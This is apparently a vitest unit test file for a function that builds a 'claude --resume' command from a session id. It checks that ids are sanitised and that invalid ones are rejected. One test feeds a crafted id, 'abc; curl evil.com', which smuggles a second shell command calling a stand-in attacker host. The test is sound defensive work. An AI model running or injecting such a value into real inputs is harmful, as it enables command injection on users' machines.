import { describe, it, expect } from 'vitest'
import { resumeCommand } from './resumeCommand'

describe('resumeCommand', () => {
  it('builds the resume line for a normal UUID session id', () => {
    expect(resumeCommand('a1b2c3d4-e5f6-7890-abcd-ef1234567890')).toBe(
      'claude --resume a1b2c3d4-e5f6-7890-abcd-ef1234567890'
    )
  })

  it('strips shell metacharacters from a crafted id so nothing injects into the PTY', () => {
    const cmd = resumeCommand('abc; curl evil.com')
    expect(cmd?.startsWith('claude --resume ')).toBe(true)
    const arg = cmd!.slice('claude --resume '.length)
    expect(arg).toBe('abccurlevilcom') // `;`, space and `.` removed → one inert token
    expect(/^[a-zA-Z0-9_-]+$/.test(arg)).toBe(true) // no metachar / whitespace survived
  })

  it('returns undefined when no valid id remains (→ caller does a fresh launch)', () => {
    expect(resumeCommand('; ;')).toBeUndefined()
    expect(resumeCommand('')).toBeUndefined()
    expect(resumeCommand(undefined)).toBeUndefined()
  })
})
